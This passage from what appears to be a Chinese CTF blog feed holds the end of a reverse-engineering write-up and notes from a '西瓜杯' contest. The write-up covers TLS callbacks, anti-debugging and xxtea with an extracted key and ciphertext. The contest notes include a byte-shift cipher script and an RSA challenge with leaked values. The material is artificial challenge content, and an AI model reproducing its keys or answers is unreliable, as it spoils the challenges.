DLL_PROCESS_ATTACH 0</span></span><br><span class="line"><span class="comment">//主线程调用main前调用TLS回调函数，调用原因为DLL_PROCESS_ATTACH</span></span><br><span class="line"><span class="comment">//子线程启动前调用TLS，原因为DLL_THREAD_ATTACH</span></span><br><span class="line"><span class="comment">//子线程结束后调用TLS，原因为DLL_THREAD_DETACH</span></span><br><span class="line"><span class="comment">//主线程结束后调用TLS 原因为DLL_PROCESS_DETACH</span></span><br></pre></td></tr></table></figure><p>而运行时调用顺序，1–2–3–0</p><h3 id="运行流程："><a href="#运行流程：" class="headerlink" title="运行流程："></a>运行流程：</h3><ul><li>进入case1，检测调试器，存在则卡死进程；通过main函数中CreateThread，接着WaitForSingleObject等待线程结束</li><li>线程进入case2，反反调试检擦，接着对sub_4a7000修改，动调进入sub_4013B0运行取出key；接着调用sub_401500进入sub_401170，base64加密</li><li>进入case3，sub_401500的调用改为sub_4013B0</li><li>退出线程，进入main中sub_401500，进行xxtea加密，比较不相同，退出进程</li><li>进入case0，TLS最后的check函数，检测后输出True</li></ul><h4 id="动调："><a href="#动调：" class="headerlink" title="动调："></a>动调：</h4><p>（一定要应用修改于程序……（Edit–&gt;</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240812010612755.png" alt="image-20240812010612755"></p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240812011907961.png" alt="image-20240812011907961"></p><p>Qu7e3T0yEknVghYa6vf1oOsF94H+LxIqbtKpzw8U5CJN2XlZRPM&#x2F;SdAWDGcjBimr</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240812012210949.png" alt="image-20240812012210949"></p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240812012718410.png" alt="image-20240812012718410"></p><p>发现跳转至4013B0,</p><p>P命令构建函数，是xxtea加密，</p><p>取出key：</p><p>0x74,0x404,0xBF,0x2652</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240812011228728.png" alt="image-20240812011228728"></p><p>取出密文：</p><p>dd 3400A0D0h, 0B23CFFEBh, 0CDE69111h, 32D0771h, 0FA1D9E6Ch<br>.data:004A7450                 dd 9D15360Ah, 933EBF03h, 9F12DDA6h, 8C58DDA1h, 46BEE3E0h<br>.data:004A7464                 dd 4476F65h, 3C44CEF9h</p><p>顺序求解就ok</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;BUUCTF-2023-WEEK4-REVERSE-kooh-slT&quot;&gt;&lt;a href=&quot;#BUUCTF-2023-WEEK4-REVERSE-kooh-slT&quot; class=&quot;headerlink&quot; title=&quot;BUUCTF 2023 WEEK4|REVERS</summary>
      
    
    
    
    
    <category term="CTF TLS" scheme="https://github.com/xyy9233/xyy9233.github.io.git/tags/CTF-TLS/"/>
    
  </entry>
  
  <entry>
    <title>西瓜杯</title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/07/09/%E8%A5%BF%E7%93%9C%E6%9D%AF/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/07/09/%E8%A5%BF%E7%93%9C%E6%9D%AF/</id>
    <published>2024-07-08T16:00:00.000Z</published>
    <updated>2024-09-16T07:17:41.504Z</updated>
    
    <content type="html"><![CDATA[<h1 id="西瓜杯"><a href="#西瓜杯" class="headerlink" title="西瓜杯"></a>西瓜杯</h1><p><a href="https://ctf.show/challenges#%E8%A5%BF%E7%93%9C%E6%9D%AF%E5%AE%98%E6%96%B9wp-4415">比赛平台</a></p><p><a href="https://docs.qq.com/doc/DRmVUb1lOdmFMYmx1">wp</a></p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="他说他想结婚"><a href="#他说他想结婚" class="headerlink" title="他说他想结婚"></a>他说他想结婚</h3><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="奇怪的条形码"><a href="#奇怪的条形码" class="headerlink" title="奇怪的条形码"></a>奇怪的条形码</h3><p>一道misc，，ppt改图片长款</p><h3 id="简单密码"><a href="#简单密码" class="headerlink" title="简单密码"></a>简单密码</h3><p>没看出来</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">647669776d757e83817372816e707479707c888789757c92788d84838b878d9d</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_string</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;将输入的字符串进行加密，逐个字节递增加&quot;&quot;&quot;</span></span><br><span class="line">    encrypted_bytes = <span class="built_in">bytearray</span>(s, <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(encrypted_bytes)):</span><br><span class="line">        encrypted_bytes[i] += (i + <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> encrypted_bytes.<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_string</span>(<span class="params">hex_string</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;将加密后的16进制字符串解密&quot;&quot;&quot;</span></span><br><span class="line">    encrypted_bytes = <span class="built_in">bytearray</span>.fromhex(hex_string)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(encrypted_bytes)):</span><br><span class="line">        encrypted_bytes[i] -= (i + <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> encrypted_bytes.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;选择功能：&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;1. 加密字符串&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;2. 解密字符串&quot;</span>)</span><br><span class="line">    choice = <span class="built_in">input</span>(<span class="string">&quot;输入你的选择（1 或 2）：&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> choice == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">        plaintext = <span class="built_in">input</span>(<span class="string">&quot;输入要加密的字符串：&quot;</span>)</span><br><span class="line">        encrypted_string = encrypt_string(plaintext)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;加密后的字符串：<span class="subst">&#123;encrypted_string&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> choice == <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">        hex_string = <span class="built_in">input</span>(<span class="string">&quot;输入加密后的16进制字符串：&quot;</span>)</span><br><span class="line">        decrypted_string = decrypt_string(hex_string)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;解密后的字符串：<span class="subst">&#123;decrypted_string&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;无效的选择，请输入1或2。&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="factor"><a href="#factor" class="headerlink" title="factor"></a>factor</h3><p>题目：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> enc <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">hint = os.urandom(<span class="number">36</span>)</span><br><span class="line">tmp = bytes_to_long(hint)</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">d = getPrime(<span class="number">400</span>)</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">e = gmpy2.invert(d,phi)</span><br><span class="line">n = p*q</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line">leak1 = p^tmp</span><br><span class="line">leak2 = q^tmp</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;e = <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;leak1 = <span class="subst">&#123;leak1&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;leak2 = <span class="subst">&#123;leak2&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 145462084881728813723574366340552281785604069047381248513937024180816353963950721541845665931261230969450819680771925091152670386983240444354412170994932196142227905635227116456476835756039585419001941477905953429642459464112871080459522266599791339252614674500304621383776590313803782107531212756620796159703</span></span><br><span class="line"><span class="string">e = 10463348796391625387419351013660920157452350067191419373870543363741187885528042168135531161031114295856009050029737547684735896660393845515549071092389128688718675573348847489182651631515852744312955427364280891600765444324519789452014742590962030936762237037273839906251320666705879080373711858513235704113</span></span><br><span class="line"><span class="string">c = 60700608730139668338977678601901211800978306010063875269252006068222163102100346920465298044880066999492746508990629867396189713753873657197546664480233269806308415874191048149900822050054539774370134460339681949131037133783273410066318511508768512778132786573893529705068680583697574367357381635982316477364</span></span><br><span class="line"><span class="string">leak1 = 13342820281239625174817085182586822673810894195223942279061039858850534510679297962596800315875604798047264337469828123370586584840078728059729121435462780</span></span><br><span class="line"><span class="string">leak2 = 10901899434728393473569359914062349292412269512201554924835672710780580634465799069211035290729536290605761024818770843901501694556825737462457471235151530</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="data:image/png;base64,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